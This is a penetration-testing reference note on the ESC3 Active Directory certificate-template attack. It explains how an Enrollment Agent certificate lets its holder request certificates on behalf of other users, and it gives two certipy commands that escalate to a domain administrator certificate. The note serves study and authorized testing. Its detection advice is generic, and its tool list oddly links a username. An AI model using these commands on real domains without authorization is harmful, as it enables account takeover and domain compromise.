---
title: Active Directory - Certificate ESC3
type: technique
tags: [active-directory, adcs, certificates, esc3, exploitation, reference-import, windows]
phase: exploitation
date_created: 2026-05-13
date_updated: 2026-07-02
sources: [InternalAllTheThings]
---

# Active Directory - Certificate ESC3

## What it is

> ESC3 is when a certificate template specifies the Certificate Request Agent EKU (Enrollment Agent). This EKU can be used to request certificates on behalf of other users.

## How it works

ESC3 abuses a certificate template configured with the `Certificate Request Agent` EKU (OID 1.3.6.1.4.1.311.20.2.1), which allows the holder to enroll in other templates on behalf of arbitrary users. An attacker first obtains an enrollment agent certificate, then uses it as a proxy to request a client-authentication certificate specifying any target user, including a domain administrator. The CA issues the final certificate without verifying the real identity of the subject, because the delegation chain is trusted by design.

## Attack phases

- **Exploitation**: primary phase for this note (credential and control-plane abuse)
- **Adjacent phases**: overlaps are common once credentials or lateral paths appear

## Prerequisites

Authorized scope covering the depicted systems; valid credentials or network reach as required by each command block inside the methodology body.

## Methodology

The following imported sections retain upstream ordering, tables, and copy-pasta blocks from InternalAllTheThings.

## ESC3 - Misconfigured Enrollment Agent Templates

> ESC3 is when a certificate template specifies the Certificate Request Agent EKU (Enrollment Agent). This EKU can be used to request certificates on behalf of other users

* Request a certificate based on the vulnerable certificate template ESC3.

```ps1
$ certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'ESC3'
[*] Saved certificate and private key to 'john.pfx'
```

* Use the Certificate Request Agent certificate (-pfx) to request a certificate on behalf of other another user

```ps1
certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'
```

## References

## Bypasses and variants

Enumerate case-specific bypasses inside the methodologies above when upstream documented alternate paths.

## Detection and defence

Apply vendor baselines for logging, least privilege, patch cadence, and segmentation. Map signals to SOC playbooks relevant to each platform referenced in this page.

## Tools

- [[certipy]]
- [[john]]

## Sources

- Swisskyrepo [InternalAllTheThings](https://github.com/swisskyrepo/InternalAllTheThings) (ingest slug `InternalAllTheThings`).
